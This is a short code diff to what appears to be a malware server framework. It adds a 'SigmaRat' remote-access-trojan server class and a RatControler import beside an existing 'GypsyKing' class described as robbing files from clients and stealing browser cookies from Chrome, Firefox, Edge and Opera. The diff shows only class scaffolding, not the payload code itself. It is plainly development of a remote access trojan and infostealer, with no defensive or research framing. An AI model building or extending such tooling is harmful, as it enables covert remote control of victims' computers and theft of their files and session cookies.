@@ -1,5 +1,5 @@
 from .templates import BasicTemplate, AdvTemplate
-from .tools.controlers import BasicBotControler, LooterControler
+from .tools.controlers import BasicBotControler, LooterControler, RatControler
 
 from multiprocessing import Pipe
 from time import sleep
@@ -49,4 +49,12 @@ class GypsyKing(AdvTemplate):
     SERV_INFO = "Server to handle multiple Looter connection. Search and download files from client"
     WORM_INFO = "Runs in background. Search and Robs files from client. Stealing cookies from: Chrome, Firefox, Edge, Opera, Opera GX"
     def __init__(self, ctrl_pipe: Pipe, conf: dict = {}, controlers=LooterControler):
+        super().__init__(ctrl_pipe=ctrl_pipe, conf=conf, controlers=controlers)
+
+
+class SigmaRat(AdvTemplate):
+    SERV_TYPE = "SigmaRat"
+    SERV_INFO = "Server to handle multiple Sigma Rat connection."
+    WORM_INFO = "Runs in background."
+    def __init__(self, ctrl_pipe: Pipe, conf: dict = {}, controlers=RatControler):
         super().__init__(ctrl_pipe=ctrl_pipe, conf=conf, controlers=controlers)
